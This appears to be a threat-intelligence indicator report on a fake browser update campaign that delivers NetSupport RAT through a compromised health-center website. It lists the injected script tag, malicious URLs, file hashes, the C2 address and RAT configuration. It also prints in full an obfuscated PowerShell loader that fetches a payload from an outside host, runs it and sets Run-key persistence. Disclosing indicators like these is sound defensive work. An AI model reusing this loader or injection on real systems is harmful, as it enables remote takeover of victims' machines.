THREAT IDENTIFICATION:  FAKE BROWSER UPDATE / NETSUPPORT RAT (SMARTAPE/HANEYMANEY)

INFECTED DOMAIN
jeffersoncountyhealthcenter.org

STAGE 1 INFECTED URL
https://www.jeffersoncountyhealthcenter.org/

STAGE 1 INJECTED JAVASCRIPT
<script type='text/javascript' src="https://ilokod.com/cdn-vs/get.php"></script>

STAGE 2 USER INFO AND COOKIE CHECK URL
https://ilokod.com/cdn-vs/get.php

STAGE 2 FAKE UPDATE PAGE SOURCE AND EMBEDDED ZIP FILE URL
https://ilokod.com/cache/qzwewmrqqgqnaww.php?reqtime=1700147504726
(The .zip file is embedded as a base64 blob in what is returned from this script )

ZIP FILE HASH
Update - 620231116.zip
8c75d47b2da3aed9dbdc9541686deabf

JS FILE HASH
Update_browser_17.6436.js
d2df1eda9bef3b5466ef4e5d69e99a10

CAPTURED POWERSHELL
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Ex Bypass -NoP -C $nbHOtoxLjjoffubnSqNbXsJFkJyWlHkmkS='https://louisianaworkingdogs.com/GetImageData.php?9029';$xfrLrYtrgFBkjPKCSWcEHRIMt=(New-Object System.Net.WebClient).DownloadString($nbHOtoxLjjoffubnSqNbXsJFkJyWlHkmkS);$qvGeTyHlAidCWMcQOqd=[System.Convert]::FromBase64String($xfrLrYtrgFBkjPKCSWcEHRIMt);$zxc = Get-Random -Minimum -10000 -Maximum 10000; $vGbciLDxUhdBaRsZjV=[System.Environment]::GetFolderPath('ApplicationData')+'\DIVX'+$zxc;if (!(Test-Path $vGbciLDxUhdBaRsZjV -PathType Container)) { New-Item -Path $vGbciLDxUhdBaRsZjV -ItemType Directory };$p=Join-Path $vGbciLDxUhdBaRsZjV 'luxe.zip';[System.IO.File]::WriteAllBytes($p,$qvGeTyHlAidCWMcQOqd);try {    Add-Type -A System.IO.Compression.FileSystem;    [System.IO.Compression.ZipFile]::ExtractToDirectory($p,$vGbciLDxUhdBaRsZjV)} catch {    Write-Host 'Failed: ' + $_;    exit};$e=Join-Path $vGbciLDxUhdBaRsZjV 'client32.exe';if (Test-Path $e -PathType Leaf) {    Start-Process -FilePath $e} else {    Write-Host 'No exe.'};$FSDFSSD=Get-Item $vGbciLDxUhdBaRsZjV -Force; $FSDFSSD.attributes='Hidden';$s=$vGbciLDxUhdBaRsZjV+'\client32.exe';$k='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';$v='DIVXX';$t='String';New-ItemProperty -Path $k -Name $v -Value $s -PropertyType $t;

PAYLOAD DOWNLOAD URL
https://louisianaworkingdogs.com/GetImageData.php?9029
(This also returns a base64 encoded blob which decodes to a .zip file)

NETSUPPORT RAT ZIP FILE HASH
desktop.ini
926bd8cafbdc311361f83886b98d9f0b
(Has a .ini extension but it's a .zip file)

PAYLOAD FILE HASH
client32.exe
c4f1b50e3111d29774f7525039ff7086

PAYLOAD C2
http://5.181.156.60/fakeurl.htm

ADDITIONAL FILE HASHES
remcmdstub.exe
6fca49b85aa38ee016e39e14b9f9d6d9
(NetSupport Remote Command Prompt)

putty.exe
f838fdafd0881cf1e6040a07d78e840d

OTHER TRAFFIC OBSERVED
http://geo.netsupportsoftware.com/location/loca.asp

NETSUPPORT RAT LICENSE FILE
1200
0xa353ff01

; NetSupport License File.
; Generated on 14:45 - 17/07/2022

[[Enforce]]

[_License]
control_only=0
expiry=
inactive=0
licensee=HANEYMANEY
maxslaves=8888
os2=1
product=10
serial_no=NSM385736
shrink_wrap=0
transport=0

RADIUS SECRET
RADIUSSecret=dgAAAPpMkI7ke494fKEQRUoablcA

GATEWAY ADDRESS
[HTTP]
GatewayAddress=5.181.156.60:443
gsk=FK;E>IAODPHM@IEM:F>BBOHF
gskmode=0
GSK=FK;E>IAODPHM@IEM:F>BBOHF
GSKX=FK;E>IAODPHM@IEM:F>BBOHF

CONTENTS OF desktop.ini FILE IN NETSUPPORT ZIP FILE
[.ShellClassInfo]
IconResource=C:\Users\daddy\AppData\Local\Microsoft\OneDrive\OneDrive.exe,1

CONTENTS OF tor.pscript FILE
{
ROT 13
}
var
  StrLen, i, charNum : Word;
  Input, output: string;
begin
  Input := ReadDoc;
  Output := '';
  StrLen := Length(Input);

  for i:= 1 to StrLen do
  begin
    if (Input[i] >= 'A') and (Input[i] <= 'M') then
      Input[i] := chr(ord(Input[i]) + 13)
    else
    if (Input[i] >= 'N') and (Input[i] <= 'Z') then
      Input[i] := chr(ord(Input[i]) - 13)
    else
    if (Input[i] >= 'a') and (Input[i] <= 'm') then
      Input[i] := chr(ord(Input[i]) + 13)
    else
    if (Input[i] >= 'n') and (Input[i] <= 'z') then
      Input[i] := chr(ord(Input[i]) - 13);
  end;
  WriteDoc(Input);
end.

ADDITIONAL REFERENCES
https://www.malwarebytes.com/blog/threat-intelligence/2023/07/socgholish-copycat-delivers-netsupport-rat
https://github.com/malwareinfosec/malwareinfosec.github.io/blob/main/Web/FakeBrowserUpdates/fakebrowserupdates.md

https://medium.com/walmartglobaltech/smartapesg-4605157a5b80
https://github.com/malwareinfosec/malwareinfosec.github.io/blob/main/Web/FakeBrowserUpdates/fakebrowserupdates.md#smartapesg-traffic




